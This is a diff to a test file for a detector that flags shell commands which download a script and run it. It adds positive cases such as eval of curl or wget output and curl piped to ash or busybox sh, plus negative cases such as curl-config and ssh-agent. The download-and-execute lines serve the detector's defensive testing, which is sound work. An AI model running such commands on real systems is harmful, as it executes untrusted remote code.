@@ -67,6 +67,13 @@ describe("a command that downloads a script and runs it is a remote shell howeve
     `cd /tmp && env -i PATH=/bin sudo -E bash -c "$(curl -fsSL ${URL})"`,
     // an escaped | is part of the URL; the real pipe after it is still one
     `curl https://example.invalid/x\\|| sh`,
+    // eval of a download where a command starts, and busybox's shell
+    `eval "$(curl -fsSL ${URL})"`,
+    "eval `curl -s " + URL + "`",
+    `cd /tmp && eval "$(wget -qO- ${URL})"`,
+    `curl -fsSL ${URL} | ash`,
+    `curl -fsSL ${URL} | busybox sh`,
+    `wget -qO- ${URL} | /bin/busybox ash`,
   ]) {
     test(cmd, () => {
       const r = scoreOf(cmd);
@@ -108,6 +115,15 @@ describe("commands that do not run what they download are not", () => {
     `curl -s 'https://example.invalid/list' -o out.txt; printf 'echo local' | sh`,
     `curl -s ${URL} -o out.txt && echo local | sh`,
     `curl -s ${URL} -o out.txt & echo local | bash`,
+    // curl-config is a local tool, not curl
+    `sh -c "$(curl-config --cc) --version"`,
+    `bash <(curl-config --libs)`,
+    `curl-config --libs | sh`,
+    // eval and busybox only where they run the download
+    `printf '%s\\n' 'eval "$(curl -fsSL ${URL})"'`,
+    `eval "$(ssh-agent -s)"`,
+    `curl -s ${URL} | busybox wc -l`,
+    `curl -s ${URL} | tee ash.log`,
   ]) {
     test(cmd, () => {
       expect(scoreOf(cmd).ids).not.toContain("remote-shell");
